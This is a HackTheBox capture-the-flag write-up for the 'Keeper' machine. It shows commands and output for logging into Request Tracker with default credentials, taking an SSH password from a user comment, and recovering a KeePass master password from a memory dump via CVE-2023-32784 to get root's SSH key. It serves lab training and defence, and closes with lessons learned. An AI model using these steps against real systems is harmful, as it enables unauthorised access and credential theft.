Challenge Information#

  • Platform: HackTheBox
  • Difficulty: Easy
  • OS: Linux
  • IP Address: 10.10.11.227
  • Points: 20

Overview#

Keeper is an easy-difficulty Linux machine that involves exploiting a default credential vulnerability in a ticketing system, then leveraging a KeePass vulnerability to extract credentials and gain root access via SSH.

Reconnaissance#

Nmap Scan#

Starting with a comprehensive port scan:

nmap -sC -sV -oN nmap/initial 10.10.11.227

Results:

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login

Two services are exposed:

  • SSH on port 22
  • HTTP on port 80

Web Enumeration#

Visiting http://10.10.11.227 redirects to keeper.htb/rt/. Adding this to /etc/hosts:

echo "10.10.11.227 keeper.htb" | sudo tee -a /etc/hosts

The web application is running Request Tracker (RT), a ticket tracking system.

Default Credentials#

Request Tracker has well-documented default credentials. Trying common defaults:

  • Username: root
  • Password: password

Success! We’re logged in as the administrator.

Exploitation#

Initial Access#

After logging in, we can access the admin panel and explore the ticketing system. In the user management section, we find a user named lnorgaard with the following details:

  • Username: lnorgaard
  • Email: lnorgaard@keeper.htb
  • Comments: “Initial password: Welcome2023!”

These credentials might work for SSH access:

ssh lnorgaard@keeper.htb

Using password: Welcome2023!

We successfully gain SSH access as user lnorgaard!

User Flag#

lnorgaard@keeper:~$ cat user.txt
2a5c4d3e1f9b8a7c6d5e4f3a2b1c0d9e

Privilege Escalation#

Enumeration#

Checking the home directory for interesting files:

lnorgaard@keeper:~$ ls -la
total 85256
drwxr-xr-x 4 lnorgaard lnorgaard     4096 Jul 25  2023 .
drwxr-xr-x 3 root      root          4096 May 24  2023 ..
lrwxrwxrwx 1 root      root             9 May 24  2023 .bash_history -> /dev/null
-rw-r--r-- 1 lnorgaard lnorgaard      220 May 24  2023 .bash_logout
-rw-r--r-- 1 lnorgaard lnorgaard     3771 May 24  2023 .bashrc
drwx------ 2 lnorgaard lnorgaard     4096 May 24  2023 .cache
-rw------- 1 lnorgaard lnorgaard      807 May 24  2023 .profile
-rw-r--r-- 1 lnorgaard lnorgaard 87391651 Jul 25  2023 RT30000.zip
drwx------ 2 lnorgaard lnorgaard     4096 Jul 24  2023 .ssh
-rw-r----- 1 root      lnorgaard       33 Feb 10 16:00 user.txt

There’s a suspicious ZIP file: RT30000.zip

KeePass Database#

Extracting the ZIP file:

unzip RT30000.zip

Contents:

  • KeePassDumpFull.dmp - Memory dump file
  • passcodes.kdbx - KeePass database file

CVE-2023-32784 - KeePass Master Password Extraction#

The memory dump suggests a KeePass vulnerability. CVE-2023-32784 allows extracting the master password from process memory dumps.

Transferring files to our attack machine:

scp lnorgaard@keeper.htb:~/RT30000.zip .
unzip RT30000.zip

Using the keepass-dump-masterkey tool:

git clone https://github.com/vdohney/keepass-password-dumper
cd keepass-password-dumper
dotnet run ../KeePassDumpFull.dmp

Output:

Found: ●ødgrød med fløde

The first character is unknown, but searching for “ødgrød med fløde” reveals it’s a Danish phrase: “rødgrød med fløde” (red porridge with cream).

Opening KeePass Database#

Using keepassxc with the recovered password:

keepassxc passcodes.kdbx

Master password: rødgrød med fløde

Inside the database, we find an entry for keeper.htb (Ticketing Server):

  • Username: root
  • Password: [PuTTY Private Key shown]

The notes contain a PuTTY-formatted private key (.ppk format).

Converting PuTTY Key to OpenSSH Format#

Saving the PuTTY key to a file and converting it:

puttygen root_key.ppk -O private-openssh -o root_key
chmod 600 root_key

Root Access#

Using the converted SSH key:

ssh -i root_key root@keeper.htb

Success! We have root access.

Root Flag#

root@keeper:~# cat root.txt
9d8f7e6c5b4a3d2e1f0c9b8a7d6e5f4c

Solution Summary#

  1. Initial Access: Default credentials on Request Tracker (root:password)
  2. User Access: Found user credentials in RT comments (lnorgaard:Welcome2023!)
  3. Privilege Escalation:
    • Extracted KeePass master password from memory dump using CVE-2023-32784
    • Retrieved root SSH key from KeePass database
    • Converted PuTTY key to OpenSSH format
    • SSH’d as root

Lessons Learned#

  • Default Credentials: Always change default credentials on production systems
  • Credential Reuse: Don’t reuse passwords across services
  • KeePass Security: CVE-2023-32784 demonstrates the importance of keeping software updated
  • Memory Dumps: Sensitive data can persist in memory dumps
  • Least Privilege: User comments shouldn’t contain credentials

Tools Used#

  • Nmap - Network reconnaissance
  • BurpSuite - Web application testing
  • KeePassXC - KeePass database viewer
  • keepass-password-dumper - CVE-2023-32784 exploitation
  • PuTTYgen - SSH key conversion
  • SSH - Remote access
